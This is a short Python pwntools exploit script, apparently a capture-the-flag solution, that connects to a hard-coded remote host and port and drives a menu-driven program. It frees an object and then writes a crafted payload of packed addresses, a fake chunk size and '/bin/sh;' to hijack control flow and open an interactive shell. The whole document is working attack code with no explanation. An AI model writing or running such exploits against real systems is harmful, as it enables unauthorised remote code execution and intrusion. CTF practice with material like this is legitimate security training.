from pwn import *

HOST = "110.10.147.122"
PORT = 12828
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('54.180.100.218',PORT)
def make1(idx):
  s.recvuntil(">>")
  s.sendline("1")
  s.recvuntil(">>")
  s.sendline(str(idx))
def make2(dat):
  s.recvuntil(">>")
  s.sendline("1")
  s.recvuntil(">>")
  s.sendline("2")
  s.recvuntil("?")
  s.sendline(dat)
def choose(idx,dat):
  s.recvuntil(">>")
  s.sendline("2")
  s.recvuntil(":")
  s.sendline(str(idx))
  s.recvuntil(":")
  s.sendline(dat)
def play():
  s.recvuntil(">>")
  s.sendline("3")
  s.recvuntil(":")
  s.sendline("0")
def delete():
  s.recvuntil(">>")
  s.sendline("7")
s.recvuntil(":")
s.sendline("12385")
make1(1)
raw_input()
make2("1234")
make1(3)
make1(4)
choose(2,"1234")
for i in range(20):
  play()
delete()
make2(p64(0x00400E15)*2+p64(0x21)+"/bin/sh;"+p64(0x00400E15))
choose(2,"Colleague")
s.interactive()

